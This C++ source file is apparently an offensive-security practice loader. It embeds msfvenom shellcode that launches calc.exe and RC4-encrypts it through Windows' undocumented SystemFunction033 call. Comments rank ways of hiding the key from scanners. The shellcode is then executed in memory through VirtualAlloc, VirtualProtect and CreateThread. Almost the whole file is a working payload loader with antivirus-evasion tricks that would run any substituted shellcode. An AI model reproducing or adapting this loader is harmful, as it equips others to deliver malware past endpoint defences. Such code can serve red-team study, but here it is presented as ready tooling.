#include <cstdio>
#include "ntapi.h"

// Encryption/Decryption function using SystemFunction033 (RC4 encryption)
USTRING RC4EncryptionSystemFunction033(IN PBYTE pRC4Key, IN PBYTE pPayloadData, IN DWORD dwRC4KeySize, IN DWORD sPayloadSize);

BOOL exec_shellcode(USTRING shellcode);

using namespace std;

int main(int argc, char* argv[])
{
	/*
		Shellcode to execute calc.exe
		msfvenom -p windows/x64/exec CMD=calc.exe -f c
		ALWAYS VERIFY SHELLCODE YOU FIND ONLINE!
	*/
	unsigned char shellcode[] =
	{
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
	};

	// Initialize encrypted shellcode structure
	USTRING encrypted_shellcode{};

	// Least secure - char array
	unsigned char lsKey[] = "thepassword";

	// Slightly better - Hex array
	unsigned char hsKey[] = { 0x74, 0x68, 0x65, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6F, 0x72, 0x64 };

	// Stack string method - array of characters (better approach)
	unsigned char ssKey[] = { 't', 'h', 'e', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd' };

	// Switch around the key type in the parameters to test them out
	encrypted_shellcode = RC4EncryptionSystemFunction033(lsKey, shellcode, sizeof(lsKey), sizeof(shellcode));

	if (encrypted_shellcode.Buffer == NULL)
	{
		printf("[!] RC4 Encryption FAILED! Error Code: %d", GetLastError());
		return 1;
	}

	USTRING unencrypted_shellcode{};

	unencrypted_shellcode = RC4EncryptionSystemFunction033(lsKey, shellcode, sizeof(lsKey), sizeof(shellcode));

	if (unencrypted_shellcode.Buffer == NULL)
	{
		printf("[!] RC4 Encryption FAILED! Error Code: %d", GetLastError());
		return 1;
	}

	exec_shellcode(unencrypted_shellcode);

	return 0;
}


USTRING RC4EncryptionSystemFunction033(IN PBYTE pRC4Key, IN PBYTE pPayloadData, IN DWORD dwRC4KeySize, IN DWORD sPayloadSize)
{
	NTSTATUS status{};

	USTRING Key = { dwRC4KeySize, dwRC4KeySize, pRC4Key };

	USTRING Data = { sPayloadSize, sPayloadSize, pPayloadData };

	fnSystemFunction033 SystemFunction033 = (fnSystemFunction033)GetProcAddress(LoadLibrary(L"Advapi32"), "SystemFunction033");

	if (status = SystemFunction033(&Data, &Key) != NULL)
	{
		printf("[!] SystemFunction033 FAILED with error: %d", GetLastError());
		exit(-1);
	}

	printf("\nunsigned char shellcode[] = {");

	for (size_t i = 0; i < Data.Length; i++)
	{
		if (!(i % 12)) { printf("\n"); }
		printf("0x%02x, ", Data.Buffer[i]);
		if (i == Data.Length - 1) { printf("0x%02x };\n", Data.Buffer[i]); }
	}

	return Data;
}

BOOL exec_shellcode(USTRING shellcode)
{
	// Allocate memory buffer for payload
	PVOID mem_buffer = VirtualAlloc(0, shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	// Copy payload to buffer
	RtlMoveMemory(mem_buffer, shellcode.Buffer, shellcode.Length);

	// Change permissions of new buffer (optional)
	DWORD oldprotect{};
	if (!VirtualProtect(mem_buffer, shellcode.Length, PAGE_EXECUTE_READ, &oldprotect))
	{
		printf("[!] Failed to change memory protection! Error code: %d", GetLastError());
		return FALSE;
	}

	HANDLE tShellcode{};

	// Execute the shellcode in the virtually allocated buffer
	tShellcode = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)mem_buffer, 0, 0, 0);
	WaitForSingleObject(tShellcode, -1);

	CloseHandle(tShellcode);

	return TRUE;
}
